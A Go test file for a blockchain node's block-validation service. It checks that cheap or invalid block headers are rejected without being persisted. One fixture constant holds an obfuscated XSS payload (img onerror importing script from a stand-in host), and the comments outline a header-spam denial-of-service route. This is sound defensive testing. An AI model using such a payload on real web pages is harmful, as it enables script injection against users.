package blockvalidation

import (
	"context"
	"net/url"
	"testing"
	"time"

	"github.com/bsv-blockchain/go-bt/v2"
	"github.com/bsv-blockchain/go-bt/v2/bec"
	"github.com/bsv-blockchain/go-bt/v2/bscript"
	"github.com/bsv-blockchain/go-bt/v2/chainhash"
	"github.com/bsv-blockchain/go-chaincfg"
	"github.com/bsv-blockchain/teranode/errors"
	"github.com/bsv-blockchain/teranode/model"
	"github.com/bsv-blockchain/teranode/services/blockchain"
	"github.com/bsv-blockchain/teranode/services/subtreevalidation"
	"github.com/bsv-blockchain/teranode/settings"
	blockchain_store "github.com/bsv-blockchain/teranode/stores/blockchain"
	blockchainoptions "github.com/bsv-blockchain/teranode/stores/blockchain/options"
	"github.com/bsv-blockchain/teranode/ulogger"
	"github.com/bsv-blockchain/teranode/util"
	"github.com/bsv-blockchain/teranode/util/test"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"
)

// The auditor's payload from bitcoin-sv/teranode#4844: 65 bytes, no literal '/', so it survives
// the miner-tag sanitiser byte-for-byte and parses as markup.
const minerMarkupCanary = `<img src=x onerror=import('https:'+atob('Ly8=')+'audit.invalid')>`

// nBitsFrom parses a compact difficulty target for a fixture.
func nBitsFrom(t *testing.T, s string) model.NBit {
	t.Helper()

	bits, err := model.NewNBitFromString(s)
	require.NoError(t, err)

	return *bits
}

// minedHeaderWithBits builds a version-4 header carrying merkleRoot and grinds its nonce until the
// hash meets the target the header itself declares.
func minedHeaderWithBits(t *testing.T, prev, merkleRoot *chainhash.Hash, bits model.NBit, timestamp uint32) *model.BlockHeader {
	t.Helper()

	hdr := &model.BlockHeader{
		Version:        4,
		HashPrevBlock:  prev,
		HashMerkleRoot: merkleRoot,
		Timestamp:      timestamp,
		Bits:           bits,
		Nonce:          0,
	}

	for {
		if ok, _, _ := hdr.HasMetTargetDifficulty(); ok {
			return hdr
		}

		hdr.Nonce++
		require.Less(t, hdr.Nonce, uint32(50_000_000), "could not mine the fixture header")
	}
}

// canaryCoinbaseAtHeight builds a coinbase whose scriptSig encodes the given height (so the block
// clears BIP34) followed by the markup payload, so the miner tag the blockchain store would parse
// out of a persisted row is the attacker's markup. The payload carries no '/' and the whole
// scriptSig stays inside the 100-byte consensus bound.
func canaryCoinbaseAtHeight(t *testing.T, height uint32) *bt.Tx {
	t.Helper()

	privateKey, err := bec.NewPrivateKey()
	require.NoError(t, err)
	address, err := bscript.NewAddressFromPublicKey(privateKey.PubKey(), true)
	require.NoError(t, err)

	scriptSig := util.EncodeCoinbaseHeightPush(height)
	scriptSig = append(scriptSig, minerMarkupCanary...)

	coinbaseTx := bt.NewTx()
	require.NoError(t, coinbaseTx.From("0000000000000000000000000000000000000000000000000000000000000000", 0xffffffff, "", 0))
	coinbaseTx.Inputs[0].UnlockingScript = bscript.NewFromBytes(scriptSig)
	require.NoError(t, coinbaseTx.AddP2PKHOutputFromAddress(address.AddressString, 50*100000000))
	require.True(t, coinbaseTx.IsCoinbase())

	miner, err := util.ExtractCoinbaseMinerRaw(coinbaseTx, false)
	require.NoError(t, err)
	require.Contains(t, miner, minerMarkupCanary,
		"fixture precondition: the default sanitiser keeps the markup, which is what makes a persisted row dangerous")

	return coinbaseTx
}

// newNoPersistHarness wires a real sqlitememory blockchain store behind the block validation
// service, with subtree validation stubbed to succeed so the only verdicts come from the header
// gates under test.
func newNoPersistHarness(ctx context.Context, t *testing.T, tSettings *settings.Settings) (*BlockValidation, blockchain.ClientI) {
	t.Helper()

	return newHarnessWithSubtreeResult(ctx, t, tSettings, nil)
}

// newHarnessWithSubtreeResult is newNoPersistHarness with a chosen outcome for subtree validation,
// so a test can drive the subtree-validation verdicts as well as the header ones.
func newHarnessWithSubtreeResult(ctx context.Context, t *testing.T, tSettings *settings.Settings, subtreeErr error) (*BlockValidation, blockchain.ClientI) {
	t.Helper()

	utxoStore, _, _, txStore, subtreeStore, deferFunc := setup(t)
	t.Cleanup(deferFunc)

	blockChainStore, err := blockchain_store.NewStore(ulogger.TestLogger{}, &url.URL{Scheme: "sqlitememory"}, tSettings)
	require.NoError(t, err)

	blockchainClient, err := blockchain.NewLocalClient(ulogger.TestLogger{}, tSettings, blockChainStore, nil, nil)
	require.NoError(t, err)

	subtreeVal := &subtreevalidation.MockSubtreeValidation{}
	subtreeVal.Mock.On("CheckBlockSubtrees", mock.Anything, mock.Anything, mock.Anything, mock.Anything).Return(subtreeErr)

	bv := NewBlockValidation(ctx, ulogger.TestLogger{}, tSettings, blockchainClient, subtreeStore, txStore, utxoStore, nil, subtreeVal)

	return bv, blockchainClient
}

// requireNothingPersisted asserts the block left no trace in the blockchain store: no existence
// record and no header row, so nothing can later parse the peer's coinbase back out as a miner tag
// and nothing can answer a re-announcement with "already exists as invalid".
func requireNothingPersisted(ctx context.Context, t *testing.T, client blockchain.ClientI, hash *chainhash.Hash) {
	t.Helper()

	exists, err := client.GetBlockExists(ctx, hash)
	require.NoError(t, err)
	require.False(t, exists, "a final header-only verdict must persist nothing")

	_, meta, err := client.GetBlockHeader(ctx, hash)
	require.Error(t, err, "no header row may exist for a block that was never persisted")
	require.Nil(t, meta)
}

// storeInvalidParent writes a coinbase-only block marked invalid=true directly into the store, so a
// child of it reaches the parent-invalid check. The invalid write skips the store's own
// coinbase-height guard, which is what lets an arbitrary fixture stand in for a condemned block.
func storeInvalidParent(ctx context.Context, t *testing.T, client blockchain.ClientI, tSettings *settings.Settings, height uint32) *model.Block {
	t.Helper()

	coinbaseTx := coinbaseAtHeight(t, height)
	hdr := minedHeaderWithBits(t, tSettings.ChainCfgParams.GenesisHash, coinbaseTx.TxIDChainHash(),
		nBitsFrom(t, "207fffff"), uint32(time.Now().Unix())) //nolint:gosec

	parent, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), height, 0) //nolint:gosec
	require.NoError(t, err)

	require.NoError(t, client.AddBlock(ctx, parent, "test", blockchainoptions.WithInvalid(true)))

	_, meta, err := client.GetBlockHeader(ctx, parent.Hash())
	require.NoError(t, err)
	require.True(t, meta.Invalid, "fixture precondition: the parent must be stored invalid")

	return parent
}

// TestValidateBlock_ZeroWorkHeader_IsNotPersisted covers the two header-only proof-of-work gates
// (bitcoin-sv/teranode#4844). Both are FINAL verdicts on 80 bytes nobody paid for, so neither may
// leave a row behind — a row per announcement is itself the denial of service, and it would carry
// the peer's chosen coinbase as a human-facing miner tag.
func TestValidateBlock_ZeroWorkHeader_IsNotPersisted(t *testing.T) {
	initPrometheusMetrics()

	t.Run("declares a target easier than the network proof-of-work limit", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = false
		// Real mainnet parameters: their limit is about 2^224, so the 0x207fffff target below (about
		// 2^255) is easier than the network permits and the limit gate rejects it.
		mainnet := chaincfg.MainNetParams
		tSettings.ChainCfgParams = &mainnet

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		coinbaseTx := canaryCoinbaseAtHeight(t, 100)
		hdr := minedHeaderWithBits(t, tSettings.ChainCfgParams.GenesisHash, coinbaseTx.TxIDChainHash(),
			nBitsFrom(t, "207fffff"), uint32(time.Now().Unix())) //nolint:gosec

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), 100, 0) //nolint:gosec
		require.NoError(t, err)

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.True(t, errors.Is(err, errors.ErrBlockInvalid))
		require.ErrorContains(t, err, "block declares a target easier than the network proof-of-work limit",
			"the two gates must stay distinguishable so this case cannot collapse into the next one")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})

	t.Run("does not meet the target it declares", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = false

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		coinbaseTx := canaryCoinbaseAtHeight(t, 100)

		// A target far harder than the network limit, left unmined: the limit gate passes and the
		// declared-target gate is the one that fires.
		hdr := &model.BlockHeader{
			Version:        4,
			HashPrevBlock:  tSettings.ChainCfgParams.GenesisHash,
			HashMerkleRoot: coinbaseTx.TxIDChainHash(),
			Timestamp:      uint32(time.Now().Unix()), //nolint:gosec
			Bits:           nBitsFrom(t, "18000001"),
			Nonce:          12345,
		}
		met, _, _ := hdr.HasMetTargetDifficulty()
		require.False(t, met, "fixture precondition: the header must not meet its own declared target")
		require.NoError(t, hdr.HasMetPowLimit(tSettings.ChainCfgParams),
			"fixture precondition: the declared target must be harder than the network limit")

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), 100, 0) //nolint:gosec
		require.NoError(t, err)

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.True(t, errors.Is(err, errors.ErrBlockInvalid))
		require.ErrorContains(t, err, "block does not meet target difficulty")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})
}

// TestValidateBlock_Difficulty1Header_IsNotPersisted uses a header that PASSES both proof-of-work
// gates, which is the realistic attacker capability: the limit gate bounds the DECLARED target by
// the network's easiest permitted one, so clearing both costs difficulty 1 rather than a real
// block's work. Every remaining final header-only verdict must still persist nothing
// (bitcoin-sv/teranode#4844).
func TestValidateBlock_Difficulty1Header_IsNotPersisted(t *testing.T) {
	initPrometheusMetrics()

	t.Run("checkpoint conflict", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = false

		const blockHeight = uint32(100)

		otherHash, err := chainhash.NewHashFromStr("00000000000000000000000000000000000000000000000000000000deadbeef")
		require.NoError(t, err)
		tSettings.ChainCfgParams.Checkpoints = []chaincfg.Checkpoint{{Height: blockHeight, Hash: otherHash}}

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		coinbaseTx := canaryCoinbaseAtHeight(t, blockHeight)
		hdr := minedHeaderWithBits(t, tSettings.ChainCfgParams.GenesisHash, coinbaseTx.TxIDChainHash(),
			nBitsFrom(t, "207fffff"), uint32(time.Now().Unix())) //nolint:gosec

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), blockHeight, 0) //nolint:gosec
		require.NoError(t, err)
		require.False(t, block.Hash().IsEqual(otherHash))

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.True(t, errors.Is(err, errors.ErrBlockInvalid))
		require.ErrorContains(t, err, "conflicts with hardcoded checkpoint")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})

	t.Run("expected difficulty bits mismatch", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = false

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		const blockHeight = uint32(100)

		timestamp := uint32(time.Now().Unix()) //nolint:gosec

		expected, err := client.GetNextWorkRequired(ctx, tSettings.ChainCfgParams.GenesisHash, int64(timestamp))
		require.NoError(t, err)
		require.NotNil(t, expected)

		// A target that is harder than the network limit (so both proof-of-work gates pass) but is
		// not the one the chain expects. Still trivially cheap to grind — that is the point.
		wrongBits := nBitsFrom(t, "1f7fffff")
		require.NotEqual(t, expected.String(), wrongBits.String(),
			"fixture precondition: the declared bits must differ from the expected bits")

		coinbaseTx := canaryCoinbaseAtHeight(t, blockHeight)
		hdr := minedHeaderWithBits(t, tSettings.ChainCfgParams.GenesisHash, coinbaseTx.TxIDChainHash(), wrongBits, timestamp)

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), blockHeight, 0) //nolint:gosec
		require.NoError(t, err)

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.True(t, errors.Is(err, errors.ErrBlockInvalid))
		require.ErrorContains(t, err, "incorrect difficulty bits")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})

	t.Run("contextual header failure under optimistic mining", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = true

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		const blockHeight = uint32(100)

		// Three hours in the future: past the two-hour bound, and reversible, since the wall clock
		// alone turns this block legitimate.
		timestamp := uint32(time.Now().Add(3 * time.Hour).Unix()) //nolint:gosec

		expected, err := client.GetNextWorkRequired(ctx, tSettings.ChainCfgParams.GenesisHash, int64(timestamp))
		require.NoError(t, err)
		require.NotNil(t, expected)

		coinbaseTx := canaryCoinbaseAtHeight(t, blockHeight)
		hdr := minedHeaderWithBits(t, tSettings.ChainCfgParams.GenesisHash, coinbaseTx.TxIDChainHash(), *expected, timestamp)

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), blockHeight, 0) //nolint:gosec
		require.NoError(t, err)

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.True(t, errors.Is(err, errors.ErrBlockInvalid))
		require.ErrorContains(t, err, "contextual validation")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})
}

// TestValidateBlock_CheapHeader_RejectedBeforeCheckpointAndParentChecks pins the first hoist: the
// two self-contained proof-of-work gates run above the checkpoint check and above the
// parent-invalid check, both of which are more expensive and the latter of which deliberately
// persists the peer-supplied body (bitcoin-sv/teranode#4844).
func TestValidateBlock_CheapHeader_RejectedBeforeCheckpointAndParentChecks(t *testing.T) {
	initPrometheusMetrics()

	unminedHeader := func(t *testing.T, prev, merkleRoot *chainhash.Hash) *model.BlockHeader {
		t.Helper()

		hdr := &model.BlockHeader{
			Version:        4,
			HashPrevBlock:  prev,
			HashMerkleRoot: merkleRoot,
			Timestamp:      uint32(time.Now().Unix()), //nolint:gosec
			Bits:           nBitsFrom(t, "18000001"),
			Nonce:          12345,
		}
		met, _, _ := hdr.HasMetTargetDifficulty()
		require.False(t, met, "fixture precondition: the header must not meet its own declared target")

		return hdr
	}

	t.Run("ahead of the checkpoint check", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = false

		const blockHeight = uint32(100)

		otherHash, err := chainhash.NewHashFromStr("00000000000000000000000000000000000000000000000000000000deadbeef")
		require.NoError(t, err)
		tSettings.ChainCfgParams.Checkpoints = []chaincfg.Checkpoint{{Height: blockHeight, Hash: otherHash}}

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		coinbaseTx := canaryCoinbaseAtHeight(t, blockHeight)
		hdr := unminedHeader(t, tSettings.ChainCfgParams.GenesisHash, coinbaseTx.TxIDChainHash())

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), blockHeight, 0) //nolint:gosec
		require.NoError(t, err)

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.ErrorContains(t, err, "block does not meet target difficulty")
		require.NotContains(t, err.Error(), "conflicts with hardcoded checkpoint")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})

	t.Run("ahead of the parent-invalid check", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		tSettings := test.CreateBaseTestSettings(t)
		tSettings.BlockValidation.OptimisticMining = false

		bv, client := newNoPersistHarness(ctx, t, tSettings)

		parent := storeInvalidParent(ctx, t, client, tSettings, 1)

		coinbaseTx := canaryCoinbaseAtHeight(t, 2)
		hdr := unminedHeader(t, parent.Hash(), coinbaseTx.TxIDChainHash())

		block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), 2, 0)
		require.NoError(t, err)

		err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
		require.Error(t, err)
		require.ErrorContains(t, err, "block does not meet target difficulty")
		require.NotContains(t, err.Error(), "parent block is invalid")

		requireNothingPersisted(ctx, t, client, block.Hash())
	})
}

// TestValidateBlock_Difficulty1ChildOfInvalidParent_RejectedOnNBitsNotPersisted pins the second
// hoist, which is the only thing closing the cheap spam route into the parent-invalid site
// (bitcoin-sv/teranode#4844). That site keeps the real body, by design, so it must not be reachable
// at difficulty 1: a child built on the current tip with the wrong difficulty bits has to be
// rejected by the expected-nBits check — which persists nothing — before it ever gets there.
//
// Without this test the hoist can be silently reverted and the residual quietly widens.
func TestValidateBlock_Difficulty1ChildOfInvalidParent_RejectedOnNBitsNotPersisted(t *testing.T) {
	initPrometheusMetrics()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	tSettings := test.CreateBaseTestSettings(t)
	tSettings.BlockValidation.OptimisticMining = false
	// No checkpoints, so the expected-nBits shortcut never engages and the gate genuinely runs.
	tSettings.ChainCfgParams.Checkpoints = nil

	bv, client := newNoPersistHarness(ctx, t, tSettings)

	parent := storeInvalidParent(ctx, t, client, tSettings, 1)

	timestamp := uint32(time.Now().Unix()) //nolint:gosec

	expected, err := client.GetNextWorkRequired(ctx, parent.Hash(), int64(timestamp))
	require.NoError(t, err)
	require.NotNil(t, expected)

	wrongBits := nBitsFrom(t, "1f7fffff")
	require.NotEqual(t, expected.String(), wrongBits.String(),
		"fixture precondition: the declared bits must differ from the expected bits")

	coinbaseTx := canaryCoinbaseAtHeight(t, 2)
	hdr := minedHeaderWithBits(t, parent.Hash(), coinbaseTx.TxIDChainHash(), wrongBits, timestamp)

	block, err := model.NewBlock(hdr, coinbaseTx, []*chainhash.Hash{}, 1, uint64(coinbaseTx.Size()), 2, 0)
	require.NoError(t, err)

	err = bv.ValidateBlockWithOptions(ctx, block, "http://localhost", &ValidateBlockOptions{PeerID: "peer-serving"})
	require.Error(t, err)
	require.True(t, errors.Is(err, errors.ErrBlockInvalid))
	require.ErrorContains(t, err, "incorrect difficulty bits")
	require.NotContains(t, err.Error(), "parent block is invalid",
		"the expected-nBits gate must run above the parent-invalid check, which keeps the real body")

	requireNothingPersisted(ctx, t, client, block.Hash())
}
